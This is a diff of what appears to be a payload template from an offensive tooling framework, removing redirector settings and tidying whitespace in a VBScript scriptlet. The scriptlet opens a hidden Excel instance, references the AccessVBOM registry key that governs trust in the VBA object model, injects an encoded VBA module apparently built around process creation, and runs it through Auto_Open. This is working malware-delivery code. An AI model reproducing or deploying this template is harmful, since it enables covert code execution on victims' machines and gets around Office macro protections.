@@ -2,12 +2,6 @@
 value: notSet
 process: decEncode
 
-[RedirectorDomain]
-value: notSet
-
-[RedirectorPort]
-value: notSet
-
 [Processx86]
 value: notSet
 
@@ -27,15 +21,15 @@ data:	<?XML version="1.0"?>
 				<script language="vbscript">
 				<![CDATA[
 					Dim objExcel, WshShell, RegPath, action, objWorkbook, xlmodule
-	
+
 		Set objExcel = CreateObject("Excel.Application")
 		objExcel.Visible = False
-	
-		Application_Version = objExcel.Version	
+
+		Application_Version = objExcel.Version
 		Set WshShell = CreateObject("Wscript.Shell")
-		
+
 		strRegPath = "HKEY_CURRENT_USER\Software\Microsoft\Office\" & Application_Version & "\Excel\Security\AccessVBOM"
-	
+
 		Set objWorkbook = objExcel.Workbooks.Add()
 		Set xlmodule = objWorkbook.VBProject.VBComponents.Add(1)
 		strCode = ${Processing:value}
@@ -44,11 +38,11 @@ data:	<?XML version="1.0"?>
 		objExcel.Run "Auto_Open"
 		objWorkbook.Close False
 		objExcel.Quit
-	
+
 					]]>
 				</script>
 			</registration>
-		</scriptlet>	
+		</scriptlet>
 
 [Processing]
 value: Private Type PROCESS_INFORMATION
@@ -124,4 +118,3 @@ value: Private Type PROCESS_INFORMATION
 		Auto_Open
 	End Sub
 process: chrEncode
-
